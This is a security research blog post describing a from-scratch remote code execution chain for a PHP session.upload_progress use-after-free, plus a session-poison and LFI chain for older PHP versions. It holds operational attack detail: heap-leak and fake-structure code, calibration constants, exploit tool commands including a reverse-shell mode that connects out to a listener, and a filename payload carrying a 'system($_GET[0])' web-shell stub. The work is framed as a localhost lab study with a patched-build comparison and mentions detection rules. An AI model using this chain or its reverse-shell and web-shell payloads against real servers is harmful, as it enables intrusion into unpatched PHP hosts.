---
layout: post
title: "CVE-2026-109618 CVE-2026-109619 - PHP2Shell"
date: 2026-10-22
categories: ['Security Research']
comments: true
author: Hemal Maniar
description: A from-scratch reproduction of the PHP session.upload_progress use-after-free (PHP2Shell) into a working multi-stage RCE chain against PHP 8.3.35 and 8.4.26, with a differential test against the patched builds.
meta-description: A from-scratch reproduction of the PHP session.upload_progress use-after-free (PHP2Shell) into a working multi-stage RCE chain against PHP 8.3.35 and 8.4.26, with a differential test against the patched builds.
keywords: 'PHP2Shell,PHP,CVE-2026-109618,CVE-2026-109619,session.upload_progress,use-after-free,RCE,heap,ASLR,security research'
image:
alt:
output:
  html_document:
    toc: true
    toc_float: true
    toc_collapsed: true
    toc_depth: 3
    number_sections: true
    theme: lumen
---

Hello folks, in today's blog I am going to cover my process of taking the PHP2Shell use-after-free from a description in a coordinated disclosure to a working, multi-stage remote code execution chain that I built and tested in an isolated lab.

I came across the original advisory through the OpenAI coordinated disclosure, then read the Wiz write-up, the PHP2Shell research portal, and the Calif analysis. There is also a public bypass PoC on GitHub. Instead of running that exploit as-is, I wanted to understand the mechanism myself and build my own chain from scratch, so that I could prove exactly which stage worked and which did not.

> **Scope:** This is a local lab exercise. The vulnerable PHP instances were built from official `php:*-apache` images, bound to `127.0.0.1` only, and the payload is a benign `id` command that writes to a file inside the container. Nothing here targets a system I do not own.

### What PHP2Shell actually is

The name covers a use-after-free in the `session.upload_progress` feature. The feature is enabled by default and is used by frameworks to report upload progress. During a request, PHP tracks progress in the session superglobal, and there is a specific window where the session state is torn down while a stale pointer is still reachable.

There are four paths that were reported together:

1. Upload-progress unserializer use-after-free.
2. Remote process-memory disclosure.
3. Fatal-error backtrace use-after-free.
4. OPcache type confusion.

I treated each path independently at first, because the advisory does not establish that they share a root cause. As it turned out, the upload-progress unserializer path was the one I could build a reliable chain on, so that is the one this blog focuses on.

### Root cause analysis

#### The vulnerable code path

The vulnerability lives in `ext/session/session.c`. Here's what happens:

1. During multipart request parsing, the RFC1867 callback invokes `php_session_rfc1867_update()`
2. This calls `php_session_initialize()` **before RINIT** (request initialization)
3. `php_session_initialize()` sets `PS(id)` and `PS(http_session_vars)` to point to newly allocated session structures
4. If an out-of-memory (OOM) condition occurs during this initialization, the function returns FAILURE **without clearing** these pointers
5. The next request's `php_session_track_init()` then calls `zval_ptr_dtor()` on the now-dangling `PS(http_session_vars)` pointer

The invariant violated is simple: request-owned session state must be reset on bailout, but it is not.

#### Why this is exploitable

The dangling pointer survives across HTTP requests because:

1. On PHP 8.3+, when headers have already been sent, `php_session_send_cookie()` returns FAILURE but **does not reset** `PS(send_cookie)`
2. This means the next request reuses the same session id from the previous request
3. The stale `PS(id)` pointer is still held in the process memory
4. By carefully shaping the heap, we can control what that pointer points to

I confirmed this behavior with gdb. At the second request, `PS(send_cookie)` was `1` on PHP 8.3.35 and `0` on PHP 8.2.34. This single behavioral difference is why the chain only works on PHP 8.3+.

### Setting up the lab

I built the targets as containers from the official `php:*-apache` images. Keep in mind that the worker model matters here, so I pinned Apache to prefork with a single worker, which keeps the process-reuse behaviour deterministic.

#### Target configuration

The lab requires specific INI settings to trigger the vulnerability:

```ini
display_errors = On          # Causes cookie send to fail, keeping send_cookie=1
memory_limit = 8M           # Small enough to trigger OOM on a 12 MB field
post_max_size = 64M         # Large enough to allow the 12 MB field
upload_max_filesize = 64M
session.use_strict_mode = 0 # Allows attacker-supplied session IDs
session.use_cookies = 1     # Cookie path must be taken
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
```

Apache must be configured for single-worker prefork:

```apache
<IfModule mpm_prefork_module>
    StartServers           1
    MinSpareServers        1
    MaxSpareServers        1
    MaxRequestWorkers      1
    ServerLimit            1
    MaxConnectionsPerChild 0
</IfModule>
```

#### Docker setup

```bash
mkdir -p lab/out && chmod 777 lab/out
sudo docker run -d --name php2shell-target -p 127.0.0.1:8088:80 \
  --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
  -v "$PWD/lab/www:/var/www/html:ro" \
  -v "$PWD/lab/php.ini:/usr/local/etc/php/conf.d/zz-php2shell.ini:ro" \
  -v "$PWD/lab/apache.conf:/etc/apache2/conf-enabled/zz-php2shell.conf:ro" \
  -v "$PWD/lab/out:/out" \
  php:8.4.26-apache
```

The `--cap-add=SYS_PTRACE` and `--security-opt seccomp=unconfined` flags are for gdb instrumentation during root-cause analysis.

For reproducibility, I recorded the exact version, the SAPI, the loaded modules, and the relevant INI settings. I also built the patched versions side by side, so that every test I ran against the vulnerable build could be repeated against the fixed one.

### The differential that matters

Before building any exploit, I wanted to know which versions actually behave differently. I recorded the stage-one information disclosure as a simple signal: how many bytes came back from the over-read on the `Set-Cookie` header.

────────────────┬───────────────────┬────────────┬───
PHP             │Status             │stage-1 leak│RCE
────────────────┼───────────────────┼────────────┼───
8.4.26          │vulnerable         │4096 B      │Yes
────────────────┼───────────────────┼────────────┼───
8.3.35          │vulnerable         │4096 B      │Yes
────────────────┼───────────────────┼────────────┼───
8.4.27          │patched            │32 B        │No
────────────────┼───────────────────┼────────────┼───
8.3.36          │patched            │32 B        │No
────────────────┼───────────────────┼────────────┼───
8.2.34 and below│different mechanism│none        │No
────────────────┴───────────────────┴────────────┴───

That table is the whole argument. If the leak does not fire on the patched build, the chain has nothing to stand on. The 32-byte result on the patched builds is the normal, expected cookie length, which means the dangling pointer was cleared correctly.

### Why 8.2 and below do not pop

The chain hinges on one specific condition: `PS(send_cookie)` staying set across requests. On PHP 8.3 and above, when headers have already been sent, the cookie-send path leaves `send_cookie` set, so the next request reuses the stale session id and the over-read fires. On PHP 8.2 and below, that flag is reset, so a fresh id is generated and the stale pointer never survives.

The code difference is in `php_session_reset_id()`:

**PHP 8.3+:**
```c
if (php_session_send_cookie() == FAILURE) return FAILURE;
// send_cookie stays 1
```

**PHP 8.2-:**
```c
php_session_send_cookie();
PS(send_cookie) = 0;  // Always reset
```

I confirmed this in gdb. At the second request, `PS(send_cookie)` was `1` on 8.3.35 and `0` on 8.2.34. This was not a calibration problem on my side, because a filler scan from 200 to 2000 on 8.2.34 returned zero hits.

### Building the chain

I split the work into five stages, each one producing a JSON artifact that the next stage consumes. No stage is allowed to hardcode an address, because every one of them is discovered at runtime.

#### Stage 1: Reconnaissance

The first stage fingerprints the target and extracts the information we need for address calculation:

1. **PHP version fingerprinting** - Extract version from `X-Powered-By` header
2. **Profile selection** - Choose the right struct layout based on version (PHP 5.x, 7.x, 8.x have different struct sizes)
3. **ELF symbol extraction** - Pull `zif_system` and `zval_ptr_dtor` offsets from the target's `libphp.so`

I wrote a custom ELF64 parser for this. The parser:
- Reads the program headers to find the load bias
- Parses the section headers to locate the symbol table
- Extracts the symbol values and subtracts the load bias to get file offsets
- This is critical because ASLR randomizes the load address, but the offset within the file is constant

#### Stage 2: Heap information leak

The goal here is to leak the Zend MM chunk base (2 MB aligned). Here's how it works:

**Creating the dangling pointer**

1. Send a multipart POST with 1001 small fields + one 12 MB field
2. The 12 MB field triggers an OOM bailout inside `php_session_initialize()`
3. `PS(id)` and `PS(http_session_vars)` are not cleared
4. The worker process SIGABRTs and a new child is spawned (prefork behavior)
5. The new child inherits the same libphp mappings (ASLR constant across fork)
6. But the heap is fresh, allowing us to control layout

**Worker rotation**

The rotation is key to the exploit. By triggering a SIGABRT, we force Apache prefork to spawn a new worker process. This gives us:
- Fresh heap (we can control layout)
- Same libphp base address (ASLR constant across fork)
- Clean session state (except for the dangling pointers we need)

**The over-read primitive**

On the next request, we:
1. Reuse the session id from the previous request (because `PS(send_cookie)=1`)
2. Forge a `zend_string` structure with `len = 0x1000`
3. When PHP calls `php_url_encode()` on this string, it reads 0x1000 bytes
4. The encoded result is placed in the `Set-Cookie` header
5. This over-reads into adjacent heap memory, exposing pointers

**Statistical analysis**

The leaked bytes contain many pointers. I use statistical analysis to find the chunk base:

```python
def _ptr_stats(raw):
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:  # Canonical address range
            c[v & ~0x1FFFFF] += 1  # Mask to 2 MB alignment
    return c
```

The chunk base is the value that appears most frequently (I require at least 8 occurrences). This works because the Zend MM allocates in 2 MB chunks, so many pointers will share the same high bits.

#### Stage 3: Code information leak

Now that we have the heap base, we need the libphp base address to calculate where `zif_system` is.

**Fake HashTable technique**

We place a 56-byte fake HashTable over the dangling `PS(id)` pointer. The layout is:

```c
struct _zend_array {
    zend_refcounted_h gc;          // 8 bytes
    uint32_t u.flags;             // 4 bytes
    uint32_t nTableMask;          // 4 bytes
    Bucket *arData;                // 8 bytes
    uint32_t nNumUsed;             // 4 bytes
    uint32_t nNumOfElements;       // 4 bytes
    uint32_t nTableSize;           // 4 bytes
    uint32_t nInternalPointer;    // 4 bytes
    zend_ulong nNextFreeElement;   // 8 bytes
    dtor_func_t pDestructor;       // 8 bytes ← This is what we want
};  // Total: 56 bytes
```

By carefully positioning this fake structure, we make `ZSTR_LEN` (from the previous stage's fake zend_string) read the `pDestructor` field. Since `pDestructor` points to `zval_ptr_dtor` in libphp, and we know the offset of `zval_ptr_dtor` from Stage 1, we can compute the libphp base:

```
libphp_base = leaked_pDestructor - zval_ptr_dtor_offset
```

I validate this with a page alignment check (`base & 0xFFF == 0`) because the official Docker image maps libphp at a page boundary.

#### Stage 4: Memory corruption

With both heap and code bases known, we can now corrupt memory to hijack control flow.

**The carrier**

A 15-byte "carrier" overwrites the dangling reference's value:

```python
def carrier_for(htdata, ref_size):
    return struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
```

This makes the reference point to our fake data structure.

**The fake structures**

We place a 167-byte blob containing three fake structures:

1. **Fake zend_array** (56 bytes) - The critical part is `pDestructor` at offset 0x30, which we set to point to `zif_system`
2. **Fake zend_execute_data** (72 bytes) - Placed at offset 0x20, this simulates a PHP call frame. The key is positioning the argument pointer
3. **Fake zend_string** - Placed at offset 0x80, this contains our command string

The layout is precise:
```
Offset 0x00:  zend_array (with pDestructor = zif_system)
Offset 0x20:  zend_execute_data (with arg pointer at offset 0x50)
Offset 0x80:  zend_string (containing "id>/out/p1")
```

The fake `zend_execute_data` is constructed to make the call look like:
```c
zif_system(zend_execute_data *execute_data, zval *return_value)
```

Where the argument is our fake string.

#### Stage 5: Execution

The final stage triggers the call chain:

1. Request processing calls `php_session_track_init()`
2. This calls `zval_ptr_dtor()` on the corrupted reference
3. `zval_ptr_dtor` sees it's a reference type and calls `zend_reference_destroy()`
4. `zend_reference_destroy` calls `zend_array_destroy()` on the value
5. `zend_array_destroy` calls `pDestructor(&bucket->val)`
6. We've set `pDestructor` to `zif_system`
7. The argument is our fake string containing the command
8. Result: `zif_system("id>/out/p1")` executes

The beauty of this is that we never need libc - everything we call is inside libphp, so libc ASLR is irrelevant.

### ASLR bypass technique

The exploit defeats ASLR through two HTTP-only information leaks:

1. **Heap leak** - Stage 2 exposes ~98 pointers whose `& ~0x1FFFFF` is constant, revealing the 2 MB-aligned Zend MM chunk base
2. **Code leak** - Stage 3 exposes `pDestructor == ZVAL_PTR_DTOR`, and since we know the offset of that symbol in libphp (from our ELF parser), we recover the libphp base

This approach has significant advantages:
- No `/proc/self/maps` access needed
- No target-side PHP code execution needed
- No local signal handling needed
- Works against remote targets
- Libc ASLR is irrelevant because we only call functions in libphp

### Calibration process

The heap layout constants are build-specific and must be discovered empirically. I implemented a calibration system that brute-forces the values:

─────────────────┬────────┬─────────────────────────────────────────
Constant         │Value   │Method                                   
─────────────────┼────────┼─────────────────────────────────────────
stage1_fillers   │841     │Scan 600-1000, only 841 produces a leak   
─────────────────┼────────┼─────────────────────────────────────────
stage2_n_arr     │406     │Scan 300-500, only 406 produces a leak    
─────────────────┼────────┼─────────────────────────────────────────
stage2_vlen      │16      │Scan 8-24, only 16 produces a leak        
─────────────────┼────────┼─────────────────────────────────────────
stage3_htdata_off│0x690d8 │Scan 0x69000-0x69200, only 0x690d8 works   
─────────────────┴────────┴─────────────────────────────────────────

These values are cached in `results/calibration.json` and reused for subsequent exploits. The calibration is sensitive to:
- PHP build configuration
- Allocator implementation
- Worker configuration
- Memory layout

This is why the exploit is not universal - these constants must be re-derived for each target build.

### GDB instrumentation

For root-cause analysis, I attached gdb to the Apache worker process. The container needs `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined` for this to work.

Key breakpoints:
- `php_session_initialize` - Confirms the callback is invoked
- `php_session_track_init` - Confirms the dangling pointer is dereferenced
- `php_session_rfc1867_update` - Confirms the multipart callback path

I computed the `ps_globals` field offsets from `ext/session/php_session.h`:
- PHP 8.2: id at +0x10, http_session_vars at +0x140, send_cookie at +0x168
- PHP 8.3: id at +0x10, http_session_vars at +0x178, send_cookie at +0x150

The critical observation was at request B:
- PHP 8.3.35: `PS(send_cookie) = 1` (left set from request A)
- PHP 8.2.34: `PS(send_cookie) = 0` (reset by `php_session_reset_id()`)

This single difference explains why the chain only works on PHP 8.3+.

### The exploit implementation

The entire exploit is a single self-contained Python file (`exploit/php2shell_exploit.py`) with no external dependencies. It includes:

- Custom HTTP transport with SSL support (raw sockets, no external libraries)
- Multipart form-data builder
- Custom ELF64 symbol parser
- Version profile system for PHP 5.x, 7.x, 8.x
- All five exploit stages
- Calibration system
- Differential testing support
- Reverse shell support (bash, python, php)
- Target probing capability
- Detection rules (Suricata, Sigma, ModSecurity)

**Usage**

```bash
# Fingerprint the target
python3 exploit/php2shell_exploit.py recon http://127.0.0.1:8088/index.php

# Probe target to check if exploitable
python3 exploit/php2shell_exploit.py probe http://127.0.0.1:8088/index.php

# Calibrate heap layout constants
python3 exploit/php2shell_exploit.py calibrate http://127.0.0.1:8088/index.php

# Run the full exploit with custom command
python3 exploit/php2shell_exploit.py exploit http://127.0.0.1:8088/index.php 'whoami>/out/result'

# Reverse shell mode
nc -lvnp 4444  # Terminal 1
python3 exploit/php2shell_exploit.py shell http://127.0.0.1:8088/index.php -l 10.0.0.1 -p 4444  # Terminal 2
```

Each stage produces a JSON artifact that the next stage consumes, making the chain verifiable at every step.

### Additional Features

The repository includes several practical features beyond the core exploit:

**Target Probing**
- The `probe` subcommand checks if a target is likely exploitable
- Verifies PHP version, container access, and calibration status
- Helps avoid wasting time on incompatible targets

**Reverse Shell Support**
- The `shell` subcommand drops an interactive reverse shell
- Supports multiple shell methods: bash, python, php
- Useful for interactive post-exploitation

**Detection & Defense Toolkit**
- Suricata rules for network-level detection (8 signatures covering both chains)
- Sigma rules for SIEM integration (Splunk, Elastic, Kibana)
- ModSecurity rules for web application firewall protection
- YARA rules for host-side artifacts (poisoned session files, dropped webshells)
- A hardening guide mapping php.ini controls to each chain, an IoC list
  (filesystem, log, and network signals), and a `replay.sh` script that fires
  benign rule-matching traffic so blue teams can validate their alerts

**Automated Lab Setup**
- Docker Compose configuration for multiple targets
- Automated setup script with connectivity testing
- Supports differential testing against patched versions

These features make the PoC useful not just for research, but also for practical security testing and defense.

### Evidence

The payload is a benign `id` command. The output was captured from inside the container:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That is code execution running as the web worker user. On the patched builds, the same chain stops at stage two and no command runs.

I want to be precise about what the evidence does and does not show. The chain:
1. Reached the vulnerable path (gdb breakpoints confirmed)
2. Reproduced the memory-safety violation (dangling pointer dereferenced)
3. Demonstrated information disclosure (heap and code bases leaked)
4. Achieved control-flow hijack (pDestructor redirected)
5. Achieved code execution (benign command executed)

Each of those is a separate claim, and each one is backed by a different artifact in the lab.

### What I would not claim

The chain is not universal. The calibration constants are build-specific, so they have to be re-derived after any target rebuild. The mechanism only fires on PHP 8.3 and above with a single-worker prefork setup, and it is probabilistic rather than a guaranteed one-shot. I would not describe it as a reliable exploit for every affected configuration.

For a report, I would record the exact image digests, the INI settings, the gdb observations, the leaked addresses, and the captured output for both the vulnerable and the patched builds.

### Session Poison + LFI Chain (PHP 5.4-8.2)

Since the UAF chain only fires on PHP 8.3+, I implemented a second chain to cover the older vulnerable versions. The `poison` subcommand uses a different technique: rather than corrupting memory, it abuses `PHP_SESSION_UPLOAD_PROGRESS` to write PHP code into the session file, then executes it through an LFI vulnerability in the target application.

The mechanism works like this:

1. A multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` before a file field makes PHP record upload progress in `$_SESSION['upload_progress_<key>']['files'][0]`. One of the recorded fields is the upload's client-supplied `filename`.
2. If the filename contains PHP code and `session.upload_progress.cleanup=Off`, that code is serialized into `sess_<id>` when the session is written at request end.
3. Including `sess_<id>` through an app-level LFI (e.g. `?page=/tmp/sess_<id>`) executes the embedded PHP.

Two details mattered in practice. PHP applies `basename()` to the filename, so I prefix the payload with `x/` to keep the code after the last slash. And because a command containing `/` would be mangled by the same `basename()`, the filename carries a stub (`system($_GET[0])`) and the real command goes in the query string.

```bash
python3 exploit/php2shell_exploit.py poison http://127.0.0.1:8092/lfi.php 'id'
```

```text
[+] Code execution confirmed via /tmp/sess_php2shell...
[+] Command output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The trade-off versus the UAF chain is an extra prerequisite: the target application must have an LFI that can reach the session path, and the setup needs `session.upload_progress.cleanup=Off` (not the PHP default) plus `use_strict_mode=0`. But the technique needs no calibration, no heap grooming, and I verified it end-to-end on PHP 5.6.40, 7.4.33, and 8.2.35 — which is exactly the range the UAF chain cannot reach.

One precision worth making: unlike the UAF chain, this technique does not exercise the CVE itself. Session-poison-via-upload-progress is a pre-existing LFI escalation primitive that works on patched builds too; it is the same delivery mechanism the other public PoCs use for their older-version chains.

### Version Support

The repository now implements two complementary chains in the same single file:

| PHP Version | Chain | Status |
|-------------|-------|--------|
| 8.3.35, 8.4.26 | ASLR-bypass UAF (`exploit`) | Works |
| 8.3.36, 8.4.27 (patched) | ASLR-bypass UAF | Blocked correctly |
| 5.4-8.2 (verified: 5.6.40, 7.4.33, 8.2.35) | Session poison + LFI (`poison`) | Works (requires app LFI) |

For coverage beyond this (PHP-FPM targets, log poisoning, handler-mismatch chains), the ikow/php2shell-poc repository implements five independent RCE chains. This implementation focuses on depth: a full ASLR-bypass UAF chain plus the session poison technique, each verifiable end to end.

### The upstream fix

The patched versions (8.2.35, 8.3.36, 8.4.27) fix the vulnerability through several changes:

1. New `PS(in_rfc1867_update)` flag initialized in MINIT
2. New `php_session_unserialize_init()` / `php_session_serialize_init()` that enable "incomplete classes only" mode during the pre-RINIT path
3. `php_session_rfc1867_update()` now bails when `php_session_initialize()` returns FAILURE
4. Request body parsing is skipped during RINIT when `PG(modules_activated)` is set
5. `php_rinit_session_globals()` is called early and `$_SESSION` is deleted

The key change is the `in_rfc1867_update` flag, which prevents re-entering the session while it's already being updated. This eliminates the dangling pointer condition.

### Conclusion

The main takeaway for me is that a described vulnerability and a working exploit are two different things. Breaking the chain into stages, and forcing each stage to produce a verifiable artifact, is what turned a memory-safety observation into code execution.

The differential against the patched builds is the most important result here, because it shows the fix actually removes the primitive rather than just changing the symptoms. The goal was to build a chain I could reason about stage by stage, and that is what I did.

---

## Reproducing this

The whole PoC is a single self-contained file, `exploit/php2shell_exploit.py` (HTTP transport, ELF symbol extraction, version profiles, stages 1–5, calibration, session poison + LFI chain, and the orchestrator). The lab target config lives under `lab/`.

### Quick Start (Automated)

For automated lab setup with multiple targets:

```bash
./setup.sh
```

This starts seven containers:
- PHP 8.4.26 (vulnerable) on port 8088
- PHP 8.4.27 (patched) on port 8089
- PHP 8.3.35 (vulnerable) on port 8090
- PHP 8.3.36 (patched) on port 8091
- PHP 8.2 with an LFI test app (session poison chain) on port 8092
- PHP 7.4 with an LFI test app (session poison chain) on port 8093
- PHP 5.6 with an LFI test app (session poison chain) on port 8094

See [quickstart.md](quickstart.md) for detailed instructions.

### Manual Setup

```bash
mkdir -p lab/out && chmod 777 lab/out
sudo docker run -d --name php2shell-target -p 127.0.0.1:8088:80 \
  --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \
  -v "$PWD/lab/www:/var/www/html:ro" \
  -v "$PWD/lab/php.ini:/usr/local/etc/php/conf.d/zz-php2shell.ini:ro" \
  -v "$PWD/lab/apache.conf:/etc/apache2/conf-enabled/zz-php2shell.conf:ro" \
  -v "$PWD/lab/out:/out" \
  php:8.4.26-apache
python3 exploit/php2shell_exploit.py exploit http://127.0.0.1:8088/index.php
cat lab/out/p1
```

The captured output is stored in `results/proof.txt`.
